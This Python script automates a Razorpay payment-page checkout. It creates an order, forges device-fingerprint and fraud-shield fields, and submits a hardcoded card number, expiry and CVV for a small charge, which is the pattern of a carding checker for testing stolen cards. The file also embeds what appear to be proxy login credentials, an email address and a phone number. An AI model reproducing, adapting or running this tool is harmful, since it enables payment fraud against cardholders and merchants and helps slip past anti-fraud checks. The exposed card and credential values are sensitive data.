import os
import requests
import re
import json
import time
import random
import string
import secrets
import hashlib
import urllib3
import base64
from urllib.parse import quote

urllib3.disable_warnings()

def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"): return "discover"
    elif card_number.startswith("35"): return "jcb"
    elif card_number.startswith("62"): return "unionpay"
    else: return "unknown"

def find_between(content, start, end):
    try:
        s = content.index(start) + len(start)
        e = content.index(end, s)
        return content[s:e]
    except ValueError:
        return ""

def test():
    cc_data = "4169163570432214|12|26|178"
    proxy_arg = "sg-sin.pvdata.host:8080:g2rTXPNPdcw2fzGtWKp62yH:nizar1clad2"
    
    try:
        cc_parts = cc_data.split("|")
        cc = cc_parts[0].strip()
        mm = cc_parts[1].strip().zfill(2)
        yy = cc_parts[2].strip()[-2:]
        cvv = cc_parts[3].strip()
        year = int("20" + yy)
    except Exception as e:
        print("Invalid card format:", e)
        return

    brand = get_card_brand(cc)
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10**8)).zfill(8)
    rzp_device_id = f"1.{h}.{ts}.{rnd}"
    BASE62 = string.ascii_letters + string.digits
    rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
    BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

    session = requests.Session()
    session.verify = False
    
    # if proxy_arg:
    #     formatted_proxy = proxy_arg.strip()
    #     if formatted_proxy.count(':') == 3:
    #         parts = formatted_proxy.split(':')
    #         formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    #     elif not formatted_proxy.startswith(('http://', 'https://')):
    #         formatted_proxy = f"http://{formatted_proxy}"
    #     session.proxies = {"http": formatted_proxy, "https": formatted_proxy}
    #     print("Using proxy:", formatted_proxy)

    URL = "https://pages.razorpay.com/iicdelhi"
    AMO = 100
    EMAIL = "CodeXploide2918@gmail.com"
    PHONE = "+917006985755"

    try:
        print("Requesting URL...")
        resp_init = session.get(URL, timeout=30)
        print("Initial response status:", resp_init.status_code)
        print("Session cookies after init:", session.cookies.get_dict())
        json_match = re.search(r'var data = ({.*?});', resp_init.text, re.DOTALL)
        if not json_match:
            print("Failed to parse initial data from page. HTML snippet:")
            print(resp_init.text[:500])
            return
        
        init_data = json.loads(json_match.group(1))
        kyid = init_data["key_id"]
        plink = init_data["payment_link"]["id"]
        ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
        keyless_header = init_data.get("keyless_header")
        keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')
        print("plink:", plink, "kyid:", kyid, "ppid:", ppid)

        headers_order = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://pages.razorpay.com',
            'Referer': 'https://pages.razorpay.com/',
            'User-Agent': ua,
        }
        json_order = {
            'line_items': [{'payment_page_item_id': ppid, 'amount': AMO}],
            'notes': {
                'membership_id': 'Hsjwj',
                'member_name': 'Sam altamn',
                'email': EMAIL,
                'contact_number': PHONE,
            },
        }
        print("Creating order...")
        resp_order = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", headers=headers_order, json=json_order, timeout=30)
        print("Order response status:", resp_order.status_code)
        print("Order response text:", resp_order.text)
        order_data = json.loads(resp_order.text)
        order_id = order_data["order"]["id"]
        checkout_id = order_id.split("_")[1]
        print("order_id:", order_id, "checkout_id:", checkout_id)

        headers_public = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Referer': 'https://pages.razorpay.com/',
            'User-Agent': ua,
        }
        params_public = {
            'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
            'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
            'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
        }
        print("Requesting checkout/public...")
        resp_public = session.get('https://api.razorpay.com/v1/checkout/public', params=params_public, headers=headers_public, timeout=30)
        print("Public response status:", resp_public.status_code)
        print("Public response text:", resp_public.text[:2000])

        sessid = find_between(resp_public.text, 'window.session_token="', '";')
        if not sessid:
            m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
            if m: sessid = m.group(1)
        print("sessid:", sessid)
        print("Session cookies after public:", session.cookies.get_dict())

        headers_pref = {
            'Accept': '*/*', 'Content-type': 'application/json', 'Origin': 'https://api.razorpay.com',
            'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            'User-Agent': ua, 'x-session-token': sessid,
        }
        params_pref = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
        json_pref = {
            'query': [{'resource': r} for r in ['checkout_version_config', 'merchant', 'merchant_features', 'downtime', 'customer', 'customer_tokens', 'truecaller', 'methods', 'experiments', 'offers', 'checkout_config', 'order', 'invoice', 'buyer_protection', 'personalization']],
            'query_params': {
                'device_id': rzp_device_id, 'rtb_device_id': h, 'amount': AMO,
                'currency': 'INR', 'option_currency': 'INR', 'truecaller': False,
                'qr_required': False, 'library': 'checkoutjs', 'platform': 'browser',
                'order_id': order_id, 'payment_link_id': plink, 'contact': PHONE,
            },
            'action': 'get',
        }
        print("Posting preferences...")
        resp_pref = session.post('https://api.razorpay.com/v2/standard_checkout/preferences', params=params_pref, headers=headers_pref, data=json.dumps(json_pref), timeout=30)
        print("Preferences status:", resp_pref.status_code)
        try:
            pref_data = json.loads(resp_pref.text)
            methods = pref_data.get("methods", {})
            print("Methods keys:", list(methods.keys()))
            methods_data = methods.get("data", {})
            print("Methods data keys:", list(methods_data.keys()))
            details = methods_data.get("details", {})
            if isinstance(details, dict):
                print("details keys:", list(details.keys()))
                print("Card details value:", json.dumps(details.get("card", {}), indent=2))
            else:
                print("details:", details)
        except Exception as e:
            print("Failed to print methods:", e)

        headers_co = {
            'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
            'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            'User-Agent': ua, 'x-session-token': sessid,
        }
        params_co = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
        data_co = {
            'notes[email]': EMAIL, 'notes[phone]': PHONE[3:], 'payment_link_id': plink,
            'key_id': kyid, 'contact': PHONE, 'email': EMAIL, 'currency': 'INR',
            '_[integration]': 'payment_pages', '_[device.id]': rzp_device_id,
            '_[library]': 'checkoutjs', '_[library_src]': 'no-src', '_[current_script_src]': 'no-src',
            '_[platform]': 'browser', '_[env]': '', '_[is_magic_script]': 'false', '_[os]': 'windows',
            '_[shield][fhash]': h, '_[shield][tz]': '0', '_[device_id]': rzp_device_id,
            '_[build]': BUILD, '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
            '_[shield][browser]': 'chrome', '_[request_index]': '0', 'amount': AMO,
            'order_id': order_id, 'checkout_id': checkout_id,
        }
        coid_local = checkout_id
        print("coid_local:", coid_local)

        headers_cb = {
            "Accept": "*/*", "Content-type": "application/json", "User-Agent": ua, "x-session-token": sessid, "Origin": "https://api.razorpay.com",
            "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
        }
        payload_cb = {
            "identifiers": {"merchant": {"country": "IN"}, "card": {"country": "US", "dcc_blacklist": False, "network": brand}, "method": "card", "payment_currency": "INR"},
            "forex_charges": {"amount": AMO, "currency": "INR", "filters": {"method": "card"}}
        }
        print("Posting cb_flows...")
        resp_cb = session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}", headers=headers_cb, json=payload_cb, timeout=30)
        print("cb_flows status:", resp_cb.status_code)

        headers_create = {
            'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
            'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            'User-Agent': ua, 'x-session-token': sessid,
        }
        params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
        token_create = base64.b64encode(json.dumps([{"name": "sardine", "metadata": {"session_id": coid_local}}], separators=(',', ':')).encode()).decode()
        data_create = {
            "user_risk_providers_token": token_create, 'notes[comment]': '', 'notes[email]': EMAIL,
            'notes[phone]': PHONE[3:], 'notes[name]': 'Hell king', 'payment_link_id': plink, 'key_id': kyid,
            'contact': PHONE, 'email': EMAIL, 'currency': 'INR', '_[integration]': 'payment_pages',
            '_[checkout_id]': coid_local, '_[device.id]': rzp_device_id, '_[env]': '', '_[library]': 'checkoutjs',
            '_[library_src]': 'no-src', '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
            '_[platform]': 'browser', '_[referer]': URL, '_[shield][fhash]': h, '_[shield][tz]': '-330',
            '_[device_id]': rzp_device_id, '_[build]': BUILD, '_[shield][os]': 'windows',
            '_[shield][platform]': 'browser', '_[shield][browser]': 'chrome', '_[request_index]': '1',
            'amount': AMO, 'order_id': order_id, 'method': 'card', 'card[number]': cc,
            'card[cvv]': cvv, 'card[name]': 'Hell King', 'card[expiry_month]': mm, 'card[expiry_year]': year,
            'save': '0', 'dcc_currency': 'INR',
        }
        print("Creating payment AJAX...")
        resp_create = session.post('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax', params=params_create, headers=headers_create, data=data_create, allow_redirects=True, timeout=30)
        print("Create response status:", resp_create.status_code)
        print("Create response text:", resp_create.text)

    except Exception as e:
        print("Exception:", e)

if __name__ == "__main__":
    test()
